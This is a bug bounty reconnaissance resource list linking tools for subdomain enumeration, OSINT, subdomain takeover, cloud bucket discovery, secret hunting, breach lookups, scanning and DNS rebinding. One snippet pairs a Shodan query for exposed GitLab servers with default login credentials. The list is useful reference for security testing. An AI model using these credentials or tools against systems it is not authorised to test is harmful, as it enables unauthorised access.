```pr0xh4ck © 2022```

---
## Contents
- [Recon](#recon)
    - [IP](#ip-test)
    - [DNS](#dns)
    - [Internet Search Engine Discovery](#internet-search-engine-discovery)
    - [Sudomain Enumeration](#subdomain-enumeration)
    - [DNS Bruteforce](#dns-bruteforce)
    - [OSINT](#osint)
    - [HTTP Probing](#http-probing)
    - [Subdomain Takeover](#subdomain-takeover)
    - [Web screenshot](#web-screenshot)
    - [CMS Enumeration](#cms-enumeration)
    - [Automation](#automation)
    - [Cloud Enumeration](#cloud-enumeration)
    - [Github & Secrets](#github-secrets)
    - [Email Hunting](#email-hunting)
    - [Data Breach](#data-breach)
    - [Web Wayback](#web-wayback)
    - [Ports Scannig](#ports-scanning)
    - [WAF](#waf)
    - [Directory Search](#directory-search)
    - [Hidden File or Directory](#hidden-file-or-directory)
    - [Hidden Parameter Find](#parameter-finder)
    - [Bypass Forbidden Direcory](#bypass-forbidder-directory)
    - [Wordlists & Payloads](#wordlists-payloads)
    - [Miscellaneous](#miscellaneous)
    - [Social Engineering](#social-engineering)
    - [One Line Scripts](#scripts)
    - [API kay](#API_key)
    - [Code review](#Code_review)
    - [Log File Analyze](#log-file-analyze)
    - [Public programs](#programs)
    - [Burp Suite Extension](#burp-suite-extesion)
    - [DOS](#dos)
    - [Websocket](#Websocket)
    - [Hands On](#hands-on)
    - [Hunting Script](#Hunting-Script) 
    - [Smart Contract](#Smart-Contract)


<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
      <ul>
        <li><a href="#built-with">Built With</a></li>
      </ul>
    </li>
    <li><a href="#features">Features</a></li>
    <li><a href="#rewards">Features</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
  </ol>
</details>






---


## recon
- [zoomeye](https://www.zoomeye.org/)
- [sitelike](https://www.sitelike.org/)
- [scans](https://scans.io/)
- [Dorks-collections-list](https://github.com/cipher387/Dorks-collections-list/) - List of Github repositories and articles with list of dorks for different search engines 
- [dorksearch](https://dorksearch.com/) - Fast google dork
### shodan
- [exposure](https://exposure.shodan.io/)
- [faviconhasher](http://faviconhasher.herokuapp.com/)
- [Shodan Facet](https://www.shodan.io/search/facet?query=&facet=http.title) - recon website
- [http.favicon.hash](https://gist.github.com/yehgdotnet/b9dfc618108d2f05845c4d8e28c5fc6a) - http.favicon.hash:
```
ssl.cert.subject.CN:”*.target com”+200
http.favicon.hash:


org:"Target" http.title:"GitLab"
Username: root & pass: 5iveL!fe
Username: admin & Pass: 5iveL!fe
```



### ip-test
- [centralops](https://centralops.net/co/)
- [spyonweb](https://spyonweb.com/)
- [whoisxmlapi](https://tools.whoisxmlapi.com/reverse-whois-search) 
- [viewdns](https://viewdns.info/)
- [bgp.he.net](https://bgp.he.net/)
- [shodan cli](https://cli.shodan.io/)
- [fav-up](https://github.com/pielco11/fav-up) - IP lookup by favicon using Shodan
- [testssl.sh](https://github.com/drwetter/testssl.sh) - Testing TLS/SSL encryption anywhere on any port
- [ipaddressguide](https://www.ipaddressguide.com/) - IP address, traceroute an IP address, convert IP address into decimal value or CIDR format, and so on for both IPv4 and IPv6 format.
 
> Virtual Host Finding
- [scantrics](https://scantrics.io/tools/)
 
### dns
- [dnsrecon](https://github.com/darkoperator/dnsrecon)
- [host linux tool](https://tools.kali.org/)
- [nslookup](https://www.nslookup.io/)
```bash
apt-get update
apt-get install dnsutils
```
- [domaineye](https://domaineye.com/)
- [anslookup](https://github.com/yassineaboukir/Asnlookup)
- [dns](https://github.com/miekg/dns)
- [DNSStager](https://github.com/mhaskar/DNSStager)
- [singularity](https://github.com/nccgroup/singularity) - A DNS rebinding attack framework.
- [whonow](https://github.com/brannondorsey/whonow) - A "malicious" DNS server for executing DNS Rebinding attacks on the fly (public instance running on rebind.network:53)
- [dns-rebind-toolkit](https://github.com/brannondorsey/dns-rebind-toolkit) - A front-end JavaScript toolkit for creating DNS rebinding attacks.
- [dref](https://github.com/FSecureLABS/dref) - DNS Rebinding Exploitation Framework
- [rbndr](https://github.com/taviso/rbndr) - Simple DNS Rebinding Service
- [httprebind](https://github.com/daeken/httprebind) - Automatic tool for DNS rebinding-based SSRF attacks
- [dnsFookup](https://github.com/makuga01/dnsFookup) - DNS rebinding toolkit

> DNS public name server 
 - [nameserver](https://public-dns.info/nameservers.txt)
 - [fresh-dns-servers](https://github.com/BBerastegui/fresh-dns-servers) - Fresh DNS servers


### internet-search-engine-discovery
  - [shodan.io](https://www.shodan.io/)
    - [shodan query](https://help.shodan.io/the-basics/search-query-fundamentals) - shodan basic query 
  - [spyse](https://spyse.com/)
  - [censys](https://censys.io/ipv4)
  - [fofa](https://fofa.so/)
  - [binary edge](https://www.binaryedge.io/)


### subdomain-enumeration
 - [certificate.transparency](https://certificate.transparency.dev/)
 - [facebook](https://developers.facebook.com/tools/)
 - [crt.sh](https://crt.sh/)
```bash
curl 'https://crt.sh/?q=%.example.com&output=json' | jq '.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
```
- [tlshelpers](https://github.com/hannob/tlshelpers) - A collection of shell scripts that help handling X.509 certificate and TLS issues


 - [crtfinder](https://github.com/eslam3kl/crtfinder) - Fast tool to extract all subdomains from crt.sh website. Output will be up to sub.sub.sub.subdomain.com with standard and advanced search techniques
 - [amass](https://github.com/OWASP/Amass)
 - [subfinder](https://github.com/projectdiscovery/subfinder)
 - [dnsdumpster](https://dnsdumpster.com/)
   - [API-dnsdumpster.com](https://github.com/PaulSec/API-dnsdumpster.com) - (Unofficial) Python API
 - [assetfinder](https://github.com/tomnomnom/assetfinder)
 - [aquatone](https://www.rubydoc.info/gems/aquatone/0.4.1)
 - [censys](https://censys.io/ipv4)
 - [findomain](https://github.com/Findomain/Findomain)
 - [sublert](https://github.com/yassineaboukir/sublert)
 - [subdomainizer](https://github.com/nsonaniya2010/SubDomainizer)
 - [puredns](https://github.com/d3mondev/puredns)
 - [findfrontabledoamin](https://github.com/rvrsh3ll/FindFrontableDomains)
 - [domainhunter](https://github.com/threatexpress/domainhunter)
 - [sudomy](https://github.com/Screetsec/Sudomy)
 - [domainbigdate](https://domainbigdata.com/)
 - [anubis](https://github.com/jonluca/anubis)
 - [ctfr](https://github.com/UnaPibaGeek/ctfr)
 - [rapiddns](https://rapiddns.io/)

> Exception(web) subdomain enumeration
 - [dns](https://dns.bufferover.run/dns?q=)
 - [tls](https://tls.bufferover.run/dns?q=)
 - [threatcrowd](https://threatcrowd.org/searchApi/v2/domain/report/?domain=)

```bash
curl -s https://dns.bufferover.run/dns?q=DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```


> Find subdomain on GitHub
 - [github-subdomain](https://github.com/gwen001/github-subdomains)

> Find subdomain from Official DoD(Depart of Defence) website
 - [mildew](https://github.com/daehee/mildew)



### dns-bruteforce
- [dnsgen](https://github.com/ProjectAnte/dnsgen)
- [altdns](https://github.com/infosec-au/altdns)
- [shuffledns](https://github.com/projectdiscovery/shuffledns)
- [dnsx](https://github.com/projectdiscovery/dnsx)
- [zdns](https://github.com/zmap/zdns)
- [subover](https://github.com/Ice3man543/SubOver)
- [dnsvalidator](https://github.com/vortexau/dnsvalidator)
- [gotator](https://github.com/Josue87/gotator)
- [resolve domains](https://github.com/Josue87/resolveDomains)




### osint
 - [DarkScrape](https://github.com/itsmehacker/DarkScrape) - OSINT Tool For Scraping Dark Websites
 - [virustotal](https://www.virustotal.com/gui/home/search) - Analyze suspicious files and URLs to detect types of malware, automatically share them with the security community 
 - [RED_HAWK](https://github.com/Tuhinshubhra/RED_HAWK) - All in one tool for Information Gathering, Vulnerability Scanning and Crawling. A must have tool for all penetration testers 
 - [siteindices](https://www.siteindices.com/) - siteindices
 - [udork.sh](https://github.com/m3n0sd0n4ld/uDork)
 - [fav-up](https://github.com/pielco11/fav-up)
 - [testssl](https://github.com/drwetter/testssl.sh) - Testing TLS/SSL encryption anywhere on any port
 - [bbtz](https://github.com/m4ll0k/BBTz)
 - [sonar search](https://github.com/Cgboal/SonarSearch)
 - [notify](https://github.com/projectdiscovery/notify) - Notify is a Go-based assistance package that enables you to stream the output of several tools (or read from a file) and publish it to a variety of supported platforms.
 - [email finder](https://github.com/Josue87/EmailFinder)
 - [analytics relationships](https://github.com/Josue87/AnalyticsRelationships)
 - [mapcidr](https://github.com/projectdiscovery/mapcidr)
 - [ppfuzz](https://github.com/dwisiswant0/ppfuzz)
 - [cloud-detect](https://github.com/dgzlopes/cloud-detect)
 - [interactsh](https://github.com/projectdiscovery/interactsh)
 - [bbrf](https://github.com/honoki/bbrf-client)
 - [spiderfoot](https://github.com/smicallef/spiderfoot) - SpiderFoot automates OSINT for threat intelligence and mapping your attack surface. 
 - [visualsitemapper](http://www.visualsitemapper.com/) - free service that can quickly show an interactive visual map of your site.
 - [jwt](https://jwt.io/) - JWT.IO allows you to decode, verify and generate JWT. Gain control over your JWTs
 - [bgp.he](https://bgp.he.net/) - Internet Backbone and Colocation Provider
 - [spyse](https://spyse.com/search?query&target=ip) - Find any Internet asset by digital fingerprints
 - [whoxy](https://www.whoxy.com/) - whois database
 



### http-probing
 - [httprobe](https://github.com/tomnomnom/httprobe) - by tomnomnom
 - [httpx](https://github.com/projectdiscovery/httpx) - by project discovery
 - [httpstatus](https://httpstatus.io/) - web version 




#### subdomain-takeover
```bash
host -t CNAME input.com
```

 - [subjack](https://github.com/haccer/subjack) - Subdomain Takeover tool written in Go
 - [SubOver](https://github.com/Ice3man543/SubOver) - A Powerful Subdomain Takeover Tool
 - [autoSubTakeover](https://github.com/JordyZomer/autoSubTakeover) - A tool used to check if a CNAME resolves to the scope address. If the CNAME resolves to a non-scope address it might be worth checking out if subdomain takeover is possible.
 - [NSBrute](https://github.com/shivsahni/NSBrute) - Python utility to takeover domains vulnerable to AWS NS Takeover
 - [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) - "Can I take over XYZ?" — a list of services and how to claim (sub)domains with dangling DNS records.
 - [Can-I-take-over-xyz-v2](https://github.com/shifa123/Can-I-take-over-xyz-v2) - V2
 - [cnames](https://github.com/cybercdh/cnames) - take a list of resolved subdomains and output any corresponding CNAMES en masse.
 - [subHijack](https://github.com/vavkamil/old-repos-backup/tree/master/subHijack-master) - Hijacking forgotten & misconfigured subdomains
 - [tko-subs](https://github.com/anshumanbh/tko-subs) - A tool that can help detect and takeover subdomains with dead DNS records
 - [HostileSubBruteforcer](https://github.com/nahamsec/HostileSubBruteforcer) - This app will bruteforce for exisiting subdomains and provide information if the 3rd party host has been properly setup.
 - [second-order](https://github.com/mhmdiaa/second-order) - Second-order subdomain takeover scanner
 - [takeover](https://github.com/mzfr/takeover) - A tool for testing subdomain takeover possibilities at a mass scale.




### web-screenshot
- [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) - EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.
- [aquatone](https://github.com/michenriksen/aquatone) - Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
- [screenshoteer](https://github.com/vladocar/screenshoteer) - Make website screenshots and mobile emulations from the command line.
- [gowitness](https://github.com/sensepost/gowitness) - gowitness - a golang, web screenshot utility using Chrome Headless
- [WitnessMe](https://github.com/byt3bl33d3r/WitnessMe) - Web Inventory tool, takes screenshots of webpages using Pyppeteer (headless Chrome/Chromium) and provides some extra bells & whistles to make life easier.
- [eyeballer](https://github.com/BishopFox/eyeballer) - Convolutional neural network for analyzing pentest screenshots
- [scrying](https://github.com/nccgroup/scrying) - A tool for collecting RDP, web and VNC screenshots all in one place
- [Depix](https://github.com/beurtschipper/Depix) - Recovers passwords from pixelized screenshots
- [httpscreenshot](https://github.com/breenmachine/httpscreenshot/) - HTTPScreenshot is a tool for grabbing screenshots and HTML of large numbers of websites.




### cms-enumeration
> AEM
 - [aem-hacker](https://github.com/0ang3el/aem-hacker)
 - [cmseek](https://github.com/Tuhinshubhra/CMSeeK) - CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs
 - [webanlyze](https://github.com/rverton/webanalyze) - Port of Wappalyzer (uncovers technologies used on websites) to automate mass scanning. 
 - [whatweb](https://github.com/urbanadventurer/WhatWeb) - Next generation web scanner 
 - [wappalyzer](https://www.wappalyzer.com/) - wappalyzer website
 - [wappalyzer cli](https://github.com/AliasIO) - Identify technology on websites.
 - [build with](https://builtwith.com/)
 - [build with cli](https://github.com/claymation/python-builtwith) - BuiltWith API client 
 - [backlinkwatch](http://backlinkwatch.com/index.php) - Website for backlink finding
 - [retirejs](https://github.com/RetireJS/retire.js) -scanner detecting the use of JavaScript libraries with known vulnerabilities 




### automation
- [inventory](https://github.com/trickest/inventory) - Asset inventory on public bug bounty programs. 
- [bugradar](https://github.com/samet-g/bugradar) - Advanced external automation on bug bounty programs by running the best set of tools to perform scanning and finding out vulnerabilities.
- [wapiti-scanner](https://github.com/wapiti-scanner) - Scan your website 
- [nuclei](https://github.com/projectdiscovery/nuclei) - Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use.
   - [Nuclei-Templates-Collection](https://github.com/emadshanab/Nuclei-Templates-Collection) - Nuclei templates collection
   - [the-nuclei-templates](https://github.com/geeknik/the-nuclei-templates) - Nuclei templates written by us. 
- [scant3r](https://github.com/knassar702/scant3r) - ScanT3r - Module based Bug Bounty Automation Tool
- [Sn1per](https://github.com/1N3/Sn1per) - Automated pentest framework for offensive security experts
- [metasploit-framework](https://github.com/rapid7/metasploit-framework) - Metasploit Framework
- [nikto](https://github.com/sullo/nikto) - Nikto web server scanner 
- [arachni](https://github.com/Arachni/arachni) - Web Application Security Scanner Framework
- [jaeles](https://github.com/jaeles-project/jaeles) - The Swiss Army knife for automated Web Application Testing
- [retire.js](https://github.com/RetireJS/retire.js) - scanner detecting the use of JavaScript libraries with known vulnerabilities
- [Osmedeus](https://github.com/j3ssie/Osmedeus) - Fully automated offensive security framework for reconnaissance and vulnerability scanning
- [getsploit](https://github.com/vulnersCom/getsploit) - Command line utility for searching and downloading exploits
- [flan](https://github.com/cloudflare/flan) - A pretty sweet vulnerability scanner
- [Findsploit](https://github.com/1N3/Findsploit) - Find exploits in local and online databases instantly
- [BlackWidow](https://github.com/1N3/BlackWidow) - A Python based web application scanner to gather OSINT and fuzz for OWASP vulnerabilities on a target website. 
- [backslash-powered-scanner](https://github.com/PortSwigger/backslash-powered-scanner) - Finds unknown classes of injection vulnerabilities
- [Eagle](https://github.com/BitTheByte/Eagle) - Multithreaded Plugin based vulnerability scanner for mass detection of web-based applications vulnerabilities
- [cariddi](https://github.com/edoardottt/cariddi) - Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more... 
- [kenzer](https://github.com/ARPSyndicate/kenzer) - automated web assets enumeration & scanning
- [ReScue](https://github.com/2bdenny/ReScue) - An automated tool for the detection of regexes' slow-matching vulnerabilities.


> file upload scanner
- [fuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool. 


> Network Scanner 
- [openvas](https://www.openvas.org/) - Free software implementation of the popular Nessus vulnerability assessment system.
- [vuls](https://github.com/future-architect/vuls) - Agentless vulnerability scanner for GNU/Linux and FreeBSD, written in Go.
- [nexpose](https://www.rapid7.com/products/nexpose/download/) - Commercial vulnerability and risk management assessment engine that integrates with Metasploit, sold by Rapid7.
- [nessus](https://www.tenable.com/products/nessus) - Commercial vulnerability management, configuration, and compliance assessment platform, sold by Tenable.


> Vulnerable Pattern Search
- [gf](https://github.com/tomnomnom/gf) - A wrapper around grep, to help you grep for things
- [Gf-Patterns-Collection](https://github.com/emadshanab/Gf-Patterns-Collection) - More and more


> wordpress
- [wpscan](https://github.com/wpscanteam/wpscan)
> joomla
- [joomscan](https://github.com/OWASP/joomscan)
> drupal
- [droopescan](https://github.com/SamJoan/droopescan) - A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe. 



### cloud-enumeration 
 - [s3-inspector](https://github.com/clario-tech/s3-inspector) - Tool to check AWS S3 bucket permissions 
 - [S3-Recon](https://github.com/subzero987/S3-Recon/blob/main/S3-Recon.txt) - S3 RECON TIPS
 - [ScoutSuite](https://github.com/nccgroup/ScoutSuite)
 - [slurp](https://github.com/0xbharath/slurp)
 - [lazys3](https://github.com/nahamsec/lazys3)
 - [cloud_enum](https://github.com/initstring/cloud_enum)
 - [clovery](https://github.com/mlcsec/clovery)
 - [gcpbucketbrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)
 - [teh S3 bucketeers](https://github.com/tomdev/teh_s3_bucketeers)


> Buckets
- [S3Scanner](https://github.com/sa7mon/S3Scanner) - Scan for open AWS S3 buckets and dump the contents
- [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump) - Security Tool to Look For Interesting Files in S3 Buckets
- [CloudScraper](https://github.com/jordanpotti/CloudScraper) - CloudScraper: Tool to enumerate targets in search of cloud resources. S3 Buckets, Azure Blobs, Digital Ocean Storage Space.
- [s3viewer](https://github.com/SharonBrizinov/s3viewer) - Publicly Open Amazon AWS S3 Bucket Viewer
- [festin](https://github.com/cr0hn/festin) - FestIn - S3 Bucket Weakness Discovery
- [s3reverse](https://github.com/hahwul/s3reverse) - The format of various s3 buckets is convert in one format. for bugbounty and security testing.
- [mass-s3-bucket-tester](https://github.com/random-robbie/mass-s3-bucket-tester) - This tests a list of s3 buckets to see if they have dir listings enabled or if they are uploadable
- [S3BucketList](https://github.com/AlecBlance/S3BucketList) - Firefox plugin that lists Amazon S3 Buckets found in requests
- [dirlstr](https://github.com/cybercdh/dirlstr) - Finds Directory Listings or open S3 buckets from a list of URLs
- [Burp-AnonymousCloud](https://github.com/codewatchorg/Burp-AnonymousCloud) - Burp extension that performs a passive scan to identify cloud buckets and then test them for publicly accessible vulnerabilities
- [kicks3](https://github.com/abuvanth/kicks3) - S3 bucket finder from html,js and bucket misconfiguration testing tool
- [2tearsinabucket](https://github.com/Revenant40/2tearsinabucket) - Enumerate s3 buckets for a specific target.
- [s3_objects_check](https://github.com/nccgroup/s3_objects_check) - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files.
- [s3tk](https://github.com/ankane/s3tk) - A security toolkit for Amazon S3
- [CloudBrute](https://github.com/0xsha/CloudBrute) - Awesome cloud enumerator
- [s3cario](https://github.com/0xspade/s3cario) - This tool will get the CNAME first if it's a valid Amazon s3 bucket and if it's not, it will try to check if the domain is a bucket name.
- [S3Cruze](https://github.com/JR0ch17/S3Cruze) - All-in-one AWS S3 bucket tool for pentesters.



### github-secrets
- [githacker](https://github.com/WangYihang/GitHacker)
- [git-hound](https://github.com/tillson/git-hound)
- [gh-dork](https://github.com/molly/gh-dork) - Github dorking tool 
- [gitdorker](https://github.com/obheda12/GitDorker) - A Python program to scrape secrets from GitHub through usage of a large repository of dorks.
- [github-endpoints](https://github.com/gwen001/github-endpoints)
- [git-secrets](https://github.com/awslabs/git-secrets) - Prevents you from committing secrets and credentials into git repositories
- [gitleaks](https://github.com/zricethezav/gitleaks) - Scan git repos (or files) for secrets using regex and entropy
- [truffleHog](https://github.com/dxa4481/truffleHog) - Searches through git repositories for high entropy strings and secrets, digging deep into commit history
- [gitGraber](https://github.com/hisxo/gitGraber) - gitGraber: monitor GitHub to search and find sensitive data in real time for different online services
- [talisman](https://github.com/thoughtworks/talisman) - By hooking into the pre-push hook provided by Git, Talisman validates the outgoing changeset for things that look suspicious - such as authorization tokens and private keys.
- [GitGot](https://github.com/BishopFox/GitGot) - Semi-automated, feedback-driven tool to rapidly search through troves of public data on GitHub for sensitive secrets.
- [git-all-secrets](https://github.com/anshumanbh/git-all-secrets) - A tool to capture all the git secrets by leveraging multiple open source git searching tools
- [github-search](https://github.com/gwen001/github-search) - Tools to perform basic search on GitHub.
- [git-vuln-finder](https://github.com/cve-search/git-vuln-finder) - Finding potential software vulnerabilities from git commit messages
- [commit-stream](https://github.com/x1sec/commit-stream) - #OSINT tool for finding Github repositories by extracting commit logs in real time from the Github event API
- [gitrob](https://github.com/michenriksen/gitrob) - Reconnaissance tool for GitHub organizations
- [repo-supervisor](https://github.com/auth0/repo-supervisor) - Scan your code for security misconfiguration, search for passwords and secrets.
- [GitMiner](https://github.com/UnkL4b/GitMiner) - Tool for advanced mining for content on Github
- [shhgit](https://github.com/eth0izzle/shhgit) - Ah shhgit! Find GitHub secrets in real time
- [detect-secrets](https://github.com/Yelp/detect-secrets) - An enterprise friendly way of detecting and preventing secrets in code.
- [rusty-hog](https://github.com/newrelic/rusty-hog) - A suite of secret scanners built in Rust for performance. Based on TruffleHog
- [whispers](https://github.com/Skyscanner/whispers) - Identify hardcoded secrets and dangerous behaviours
- [yar](https://github.com/nielsing/yar) - Yar is a tool for plunderin' organizations, users and/or repositories.
- [dufflebag](https://github.com/BishopFox/dufflebag) - Search exposed EBS volumes for secrets
- [secret-bridge](https://github.com/duo-labs/secret-bridge) - Monitors Github for leaked secrets
- [earlybird](https://github.com/americanexpress/earlybird) - EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more.
  
> GitHub dork wordlist
 - [dork list](https://gist.githubusercontent.com/EdOverflow/8bd2faad513626c413b8fc6e9d955669/raw/06a0ef0fd83920d513c65767aae258ecf8382bdf/gistfile1.txt)
 - [github-dorks](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt)
 
 
> Git
- [GitTools](https://github.com/internetwache/GitTools) - A repository with 3 tools for pwn'ing websites with .git repositories available
- [gitjacker](https://github.com/liamg/gitjacker) - Leak git repositories from misconfigured websites
- [git-dumper](https://github.com/arthaud/git-dumper) - A tool to dump a git repository from a website
- [GitHunter](https://github.com/digininja/GitHunter) - A tool for searching a Git repository for interesting content
- [dvcs-ripper](https://github.com/kost/dvcs-ripper) - Rip web accessible (distributed) version control systems: SVN/GIT/HG...



### email-hunting 
  - [GHunt](https://github.com/mxrch/GHunt) - 🕵️‍♂️ Investigate Google emails and documents. 
  - [infoga](https://github.com/m4ll0k/infoga) - Infoga - Email OSINT 
  - [reconspider](https://github.com/bhavsec/reconspider) - 🔎 Most Advanced Open Source Intelligence (OSINT) Framework for scanning IP Address, Emails, Websites, Organizations. 
  - [theHarvester](https://github.com/laramies/theHarvester) - E-mails, subdomains and names Harvester - OSINT 
  - [hunter](https://hunter.io/)
  - [phonebook](https://phonebook.cz/)
  - [voilanorbert](https://www.voilanorbert.com/)
  - [verifyemailaddress](https://tools.verifyemailaddress.io/)
  - [email-checker](https://email-checker.net/)
  - [Clearbit-Connect](https://chrome.google.com/webstore/detail/clearbit-connect-supercha/pmnhcgfcafcnkbengdcanjablaabjplo?hl=en)


### data-breach
 - [pwndb](https://github.com/davidtavarez/pwndb/)
 - [breach-parse](https://github.com/hmaverickadams/breach-parse)
 - [dehashed](https://dehashed.com/)
 - [weleakinfo](https://weleakinfo.to/)
 - [leakcheck](https://leakcheck.io/)
 - [sunbase](https://snusbase.com/)
 - [intelx](https://intelx.io/)
 - [haveibeenpwned](https://haveibeenpwned.com/)
 - [scatteredsecrets](https://scatteredsecrets.com/)


### web-wayback
- [sigurlfind3r](https://github.com/signedsecurity/sigurlfind3r) - A passive reconnaissance tool for known URLs discovery - it gathers a list of URLs passively using various online sources
- [waybackurls](https://github.com/tomnomnom/waybackurls) - Fetch all the URLs that the Wayback Machine knows about for a domain
- [gau](https://github.com/lc/gau) - Fetch known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl. 
- [gauplus](https://github.com/bp0lr/gauplus) - A modified version of gau
- [waybackpy](https://github.com/akamhy/waybackpy) - Wayback Machine API Python interfaces and CLI tool. 
- [chronos](https://github.com/mhmdiaa/chronos) - Extract pieces of info from a web page's Wayback Machine history 

> Replace parameter value
- [bhedak](https://github.com/R0X4R/bhedak) - A replacement of "qsreplace", accepts URLs as standard input, replaces all query string values with user-supplied values and stdout. 


> Find reflected params
 - [gxss](https://github.com/KathanP19/Gxss) - A tool to check a bunch of URLs that contain reflecting params. 
 - [freq](https://github.com/takshal/freq) - This is go CLI tool for send fast Multiple get HTTP request.
 - [bxss](https://github.com/ethicalhackingplayground/bxss/) - A Blind XSS Injector tool
 
> Find js file from waybackurls.txt
 - [subjs](https://github.com/lc/subjs)

> Automatic put parameter value
 - [qsreplace](https://github.com/tomnomnom/qsreplace)
 - [url dedupe](https://github.com/ameenmaali/urldedupe)

> Declutters url lists
 - [uro](https://github.com/s0md3v/uro)


### ports-scanning
- [masscan](https://github.com/robertdavidgraham/masscan) - TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.
- [RustScan](https://github.com/RustScan/RustScan) - The Modern Port Scanner
- [naabu](https://github.com/projectdiscovery/naabu) - A fast port scanner written in go with focus on reliability and simplicity.
- [nmap](https://github.com/nmap/nmap) - Nmap - the Network Mapper. Github mirror of official SVN repository.
- [sandmap](https://github.com/trimstray/sandmap) - Nmap on steroids. Simple CLI with the ability to run pure Nmap engine, 31 modules with 459 scan profiles.
- [ScanCannon](https://github.com/johnnyxmas/ScanCannon) - Combines the speed of masscan with the reliability and detailed enumeration of nmap
- [unimap](https://github.com/Edu4rdSHL/unimap)

> Brute-Forcing from Nmap output
 - [brutespray](https://github.com/x90skysn3k/brutespray)


### waf
  - [wafw00f](https://github.com/enablesecurity/wafw00f)
  - [cf-check](https://github.com/dwisiswant0/cf-check)
  - [w3af](https://github.com/andresriancho/w3af) - w3af: web application attack and audit framework, the open source web vulnerability scanner.
> Waf bypass
- [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) - Firewall bypass script based on DNS history records. This script will search for DNS A history records and check if the server replies for that domain. Handy for bugbounty hunters. 
- [CloudFail](https://github.com/m0rtem/CloudFail) - Utilize misconfigured DNS and old database records to find hidden IP's behind the CloudFlare network 
 
 
 
### directory-search
- [gobuster](https://github.com/OJ/gobuster) - Directory/File, DNS and VHost busting tool written in Go
- [recursebuster](https://github.com/C-Sto/recursebuster) - rapid content discovery tool for recursively querying webservers, handy in pentesting and web application assessments
- [feroxbuster](https://github.com/epi052/feroxbuster) - A fast, simple, recursive content discovery tool written in Rust.
- [dirsearch](https://github.com/maurosoria/dirsearch) - Web path scanner
- [dirsearch](https://github.com/evilsocket/dirsearch) - A Go implementation of dirsearch.
- [filebuster](https://github.com/henshin/filebuster) - An extremely fast and flexible web fuzzer
- [dirstalk](https://github.com/stefanoj3/dirstalk) - Modern alternative to dirbuster/dirb
- [dirbuster-ng](https://github.com/digination/dirbuster-ng) - dirbuster-ng is C CLI implementation of the Java dirbuster tool
- [gospider](https://github.com/jaeles-project/gospider) - Gospider - Fast web spider written in Go
- [hakrawler](https://github.com/hakluke/hakrawler) - Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application

 

> Fuzzing
- [ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go
- [wfuzz](https://github.com/xmendez/wfuzz) - Web application fuzzer
- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb) - Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.
- [IntruderPayloads](https://github.com/1N3/IntruderPayloads) - A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists.
- [fuzz.txt](https://github.com/Bo0oM/fuzz.txt) - Potentially dangerous files
- [fuzzilli](https://github.com/googleprojectzero/fuzzilli) - A JavaScript Engine Fuzzer
- [fuzzapi](https://github.com/Fuzzapi/fuzzapi) - Fuzzapi is a tool used for REST API pentesting and uses API_Fuzzer gem
- [qsfuzz](https://github.com/ameenmaali/qsfuzz) - qsfuzz (Query String Fuzz) allows you to build your own rules to fuzz query strings and easily identify vulnerabilities.



### hidden-file-or-directory
> 18-03-22
- [relative-url-extractor](https://github.com/jobertabma/relative-url-extractor) - A small tool that extracts relative URLs from a file.
- [virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery) - A script to enumerate virtual hosts on a server. 


> JS
- [diffJs](https://github.com/CaptainFreak/diffJs) - Tool for monitoring changes in javascript files on WebApps for reconnaissance.
- [scripthunter](https://github.com/robre/scripthunter) - Tool to find JavaScript files on Websites

> Metadata 
- [exiftool](https://github.com/exiftool/exiftool) - ExifTool meta information reader/writer 

 - [earlybird](https://github.com/americanexpress/earlybird) - EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. 
 - [DumpsterDiver](https://github.com/securing/DumpsterDiver) - Tool to search secrets in various filetypes. 
 - [ChopChop](https://github.com/michelin/ChopChop) - ChopChop is a CLI to help developers scanning endpoints and identifying exposition of sensitive services/files/folders.
 - [gospider](https://github.com/jaeles-project/gospider) -  Fast web spider written in Go 
 - [gobuster](https://github.com/OJ/gobuster) - Directory/File, DNS and VHost busting tool written in Go 
 - [janusec](https://github.com/Janusec/janusec)
 - [source leak hacker](https://github.com/WangYihang/SourceLeakHacker)
 - [favfreak](https://github.com/devanshbatham/FavFreak)
 - [jwsxploiter](https://github.com/DontPanicO/jwtXploiter) - A tool to test security of json web token 
 - [bfac](https://github.com/mazen160/bfac) - BFAC (Backup File Artifacts Checker): An automated tool that checks for backup artifacts that may disclose the web-application's source code. 
 - [jsearch](https://github.com/d3ftx/jsearch)
 - [linkfinder](https://github.com/GerbenJavado/LinkFinder) - A python script that finds endpoints in JavaScript files 
 - [secretfinder](https://github.com/m4ll0k/SecretFinder) - A python script for find sensitive data (apikeys, accesstoken,jwt,..) and search anything on javascript files 
 - [jsa](https://github.com/w9w/JSA)
